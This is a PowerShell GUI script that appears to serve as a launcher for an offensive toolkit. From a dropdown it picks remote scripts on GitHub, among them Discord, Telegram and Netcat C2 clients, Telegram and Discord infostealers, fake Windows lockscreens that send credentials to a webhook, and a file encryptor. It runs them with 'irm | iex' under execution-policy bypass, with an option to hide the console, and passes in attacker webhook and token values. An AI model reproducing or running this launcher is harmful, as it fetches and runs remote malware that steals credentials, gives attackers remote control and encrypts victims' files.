$WebhookInputHeader.Text = "Discord Webhook URL"
$WebhookInputHeader.ForeColor = "#bcbcbc"
$WebhookInputHeader.AutoSize = $true
$WebhookInputHeader.Width = 25
$WebhookInputHeader.Height = 10
$WebhookInputHeader.Location = New-Object System.Drawing.Point(20, 60)
$form.Controls.Add($WebhookInputHeader)

$WebhookInput = New-Object System.Windows.Forms.TextBox
$WebhookInput.Location = New-Object System.Drawing.Point(20, 80)
$WebhookInput.BackColor = "#eeeeee"
$WebhookInput.Width = 600
$WebhookInput.Height = 40
$WebhookInput.Text = "https://discord.com/api/webhooks/..."
$WebhookInput.Multiline = $false
$form.Controls.Add($WebhookInput)

$TokenInputHeader = New-Object System.Windows.Forms.Label
$TokenInputHeader.Text = "Telegram API Token..."
$TokenInputHeader.ForeColor = "#bcbcbc"
$TokenInputHeader.AutoSize = $true
$TokenInputHeader.Width = 25
$TokenInputHeader.Height = 10
$TokenInputHeader.Location = New-Object System.Drawing.Point(20, 110)
$form.Controls.Add($TokenInputHeader)

$TGTokenInput = New-Object System.Windows.Forms.TextBox
$TGTokenInput.Location = New-Object System.Drawing.Point(20, 130)
$TGTokenInput.BackColor = "#eeeeee"
$TGTokenInput.Width = 600
$TGTokenInput.Height = 40
$TGTokenInput.Text = "Ex4mP137eLeGr4m_4pI-B0t_T0k3N"
$TGTokenInput.Multiline = $false
$form.Controls.Add($TGTokenInput)

$PastebinInputHeader = New-Object System.Windows.Forms.Label
$PastebinInputHeader.Text = "RAW Pastebin URL"
$PastebinInputHeader.ForeColor = "#bcbcbc"
$PastebinInputHeader.AutoSize = $true
$PastebinInputHeader.Width = 25
$PastebinInputHeader.Height = 10
$PastebinInputHeader.Location = New-Object System.Drawing.Point(20, 160)
$form.Controls.Add($PastebinInputHeader)

$PastebinInput = New-Object System.Windows.Forms.TextBox
$PastebinInput.Location = New-Object System.Drawing.Point(20, 180)
$PastebinInput.BackColor = "#eeeeee"
$PastebinInput.Width = 600
$PastebinInput.Height = 40
$PastebinInput.Text = "https://pastebin.com/raw/......."
$PastebinInput.Multiline = $false
$form.Controls.Add($PastebinInput)

$NetcatHeader = New-Object System.Windows.Forms.Label
$NetcatHeader.Text = "Netcat IPv4 Address"
$NetcatHeader.ForeColor = "#bcbcbc"
$NetcatHeader.AutoSize = $true
$NetcatHeader.Width = 25
$NetcatHeader.Height = 10
$NetcatHeader.Location = New-Object System.Drawing.Point(20, 210)
$form.Controls.Add($NetcatHeader)

$netcatInput = New-Object System.Windows.Forms.TextBox
$netcatInput.Location = New-Object System.Drawing.Point(20, 230)
$netcatInput.BackColor = "#eeeeee"
$netcatInput.Width = 600
$netcatInput.Height = 40
$netcatInput.Text = "192.168.0.1"
$netcatInput.Multiline = $false
$form.Controls.Add($netcatInput)

$startButton = New-Object System.Windows.Forms.Button
$startButton.Location = New-Object System.Drawing.Point(540, 30)
$startButton.Size = New-Object System.Drawing.Size(80, 30)
$startButton.Text = "Start"
$startButton.BackColor = "#fff"
$form.Controls.Add($startButton)

$infoButton = New-Object System.Windows.Forms.Button
$infoButton.Location = New-Object System.Drawing.Point(450, 30)
$infoButton.Size = New-Object System.Drawing.Size(80, 30)
$infoButton.Text = "Info"
$infoButton.BackColor = "#fff"
$form.Controls.Add($infoButton)

$hiddenboxtext = New-Object System.Windows.Forms.Label
$hiddenboxtext.Text = "Hidden Console"
$hiddenboxtext.ForeColor = "#bcbcbc"
$hiddenboxtext.AutoSize = $true
$hiddenboxtext.Width = 25
$hiddenboxtext.Height = 10
$hiddenboxtext.Location = New-Object System.Drawing.Point(340, 38)
$form.Controls.Add($hiddenboxtext)

$hiddenbox = New-Object System.Windows.Forms.CheckBox
$hiddenbox.Location = New-Object System.Drawing.Point(325, 35)
$form.Controls.Add($hiddenbox)

$OutputHeader = New-Object System.Windows.Forms.Label
$OutputHeader.Text = "Output"
$OutputHeader.ForeColor = "#bcbcbc"
$OutputHeader.AutoSize = $true
$OutputHeader.Width = 25
$OutputHeader.Height = 10
$OutputHeader.Location = New-Object System.Drawing.Point(20, 260)
$form.Controls.Add($OutputHeader)

$OutputBox = New-Object System.Windows.Forms.TextBox 
$OutputBox.Multiline = $True;
$OutputBox.Location = New-Object System.Drawing.Point(20, 280) 
$OutputBox.Width = 600
$OutputBox.Height = 150
$OutputBox.Scrollbars = "Vertical" 
$form.Controls.Add($OutputBox)

Function Add-OutputBoxLine{
    Param ($outfeed) 
    $OutputBox.AppendText("`r`n$outfeed")
    $OutputBox.Refresh()
    $OutputBox.ScrollToCaret()
}

$startButton.Add_Click({

    $selectedItem = $dropdown.SelectedItem
    if($selectedItem.length -eq 0 ){Add-OutputBoxLine -Outfeed "Nothing Selected! Please choose a tool from the dropdown menu.";return}
 
    Add-OutputBoxLine -Outfeed "$selectedItem Selected"
    $BaseURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master"
    $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"
    $HideURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Hide-Powershell-Console.ps1"
    $hookurl = $WebhookInput.Text
    $ghurl = $PastebinInput.Text
    $tg = $TGTokenInput.Text
    $NCurl = $netcatInput.Text

    switch ($selectedItem) {
        "Telegram C2 Client"       {$url = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1"}
        "Discord C2 Client"        {$url = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1"}
        "NetCat C2 Client"         {$url = "$BaseURL/NC-Func.ps1"}
        "LAN Toolset"              {$url = "https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1"}
        "Encryptor"                {$url = "$PoshcryptURL/Encryption/Encryptor.ps1"}
        "Decryptor"                {$url = "$PoshcryptURL/Decryption/Decryptor-GUI.ps1"}
        "Filetype Finder GUI"      {$url = "$BaseURL/Search-Folders-For-Filetypes-GUI.ps1"}
        "Screen Recorder GUI"      {$url = "$BaseURL/Record-Screen-GUI.ps1"}
        "Network Enumeration GUI"  {$url = "$BaseURL/Network-Enumeration-GUI.ps1"} 
        "Microphone Muter GUI"     {$url = "$BaseURL/Mute-Microphone-GUI.ps1"}
        "Webhook Spammer GUI"      {$url = "$BaseURL/Discord-Webhook-Spammer-GUI.ps1"}
        "Social Search GUI"        {$url = "$BaseURL/Social-Search-GUI.ps1"}
        "GDI effects GUI"          {$url = "$BaseURL/Desktop-GDI-Efects-GUI.ps1"}
        "Telegram Infoscrape"      {$url = "$BaseURL/Telegram-InfoStealer.ps1"}
        "Discord Infoscrape"       {$url = "$BaseURL/Discord-Infostealer.ps1"}
        "Netcat Screenshare"       {$url = "$BaseURL/Desktop-Screenshare-over-Netcat.ps1"}
        "Console MC Server Scanner"{$url = "$BaseURL/Minecraft-Server-Scanner-and-Server-Info.ps1"}
        "Console Task Manager"     {$url = "$BaseURL/Console-Task-Manager.ps1"}
        "Image To Console"         {$url = "$BaseURL/Image-to-Console.ps1"}
        "Matrix Cascade in console"{$url = "$BaseURL/Matrix-Cascade-in-Powershell.ps1"}
        "Windows 10 Lockscreen"    {$url = "$BaseURL/Fake-Windows-10-Lockscreen-to-Webhook.ps1"}
        "Windows 11 Lockscreen"    {$url = "$BaseURL/Fake-Windows-11-Lockscreen-to-Webhook.ps1"}
        "Dummy Folder Creator"     {$url = "$BaseURL/Dummy-Folder-Creator.ps1"}
    }

    Add-OutputBoxLine -Outfeed "$selectedItem URL : $url"

    if(($hiddenbox.Checked) -and ($selectedItem -notlike "*Console*") -and ($selectedItem -notlike "*LAN*")){
        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
        Add-OutputBoxLine -Outfeed "Started $selectedItem With Console Hidden"
    }
    else{
        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$stage = `'y`' ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
        Add-OutputBoxLine -Outfeed "Started $selectedItem With Console Visible"
    }

})

$infoButton.Add_Click({
    
    $OutputBox.Clear()
    $selectedItem = $dropdown.SelectedItem
    if($selectedItem.length -eq 0 ){Add-OutputBoxLine -Outfeed "Nothing Selected! Please choose a tool from the dropdown menu.";return}
    Add-OutputBoxLine -Outfeed "$selectedItem Information/Help"
    Add-OutputBoxLine -Outfeed "=================================================================================="
    $BaseURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master"
    $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"

    switch ($selectedItem) {
        "Telegram C2 Client"       {$url = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1"}
        "Discord C2 Client"        {$url = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1"}
        "NetCat C2 Client"         {$url = "$BaseURL/NC-Func.ps1"}
        "LAN Toolset"              {$url = "https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1"}
        "Encryptor"                {$url = "$PoshcryptURL/Encryption/Encryptor.ps1"}
        "Decryptor"                {$url = "$PoshcryptURL/Decryption/Decryptor-GUI.ps1"}
        "Filetype Finder GUI"      {$url = "$BaseURL/Search-Folders-For-Filetypes-GUI.ps1"}
        "Screen Recorder GUI"      {$url = "$BaseURL/Record-Screen-GUI.ps1"}
        "Network Enumeration GUI"  {$url = "$BaseURL/Network-Enumeration-GUI.ps1"} 
        "Microphone Muter GUI"     {$url = "$BaseURL/Mute-Microphone-GUI.ps1"}
        "Webhook Spammer GUI"      {$url = "$BaseURL/Discord-Webhook-Spammer-GUI.ps1"}
        "Social Search GUI"        {$url = "$BaseURL/Social-Search-GUI.ps1"}
        "GDI effects GUI"          {$url = "$BaseURL/Desktop-GDI-Efects-GUI.ps1"}
        "Telegram Infoscrape"      {$url = "$BaseURL/Telegram-InfoStealer.ps1"}
        "Discord Infoscrape"       {$url = "$BaseURL/Discord-Infostealer.ps1"}
        "Netcat Screenshare"       {$url = "$BaseURL/Desktop-Screenshare-over-Netcat.ps1"}
        "Console MC Server Scanner"{$url = "$BaseURL/Minecraft-Server-Scanner-and-Server-Info.ps1"}
        "Console Task Manager"     {$url = "$BaseURL/Console-Task-Manager.ps1"}
        "Image To Console"         {$url = "$BaseURL/Image-to-Console.ps1"}
        "Matrix Cascade in console"{$url = "$BaseURL/Matrix-Cascade-in-Powershell.ps1"}
        "Windows 10 Lockscreen"    {$url = "$BaseURL/Fake-Windows-10-Lockscreen-to-Webhook.ps1"}
        "Windows 11 Lockscreen"    {$url = "$BaseURL/Fake-Windows-11-Lockscreen-to-Webhook.ps1"}
        "Dummy Folder Creator"     {$url = "$BaseURL/Dummy-Folder-Creator.ps1"}
    }

    $fileContent = Invoke-RestMethod -Uri $Url
    $pattern = '(?s)<#(.*?)#>'
    $matches = [regex]::Matches($fileContent, $pattern)
    
    # Output the extracted text
    foreach ($match in $matches) {
        $textInsideHashTags = $match.Groups[1].Value
        Add-OutputBoxLine -Outfeed $textInsideHashTags
    }

    Add-OutputBoxLine -Outfeed "=================================================================================="
    Add-OutputBoxLine -Outfeed "$selectedItem URL : $url"



})


[Windows.Forms.Application]::Run($form)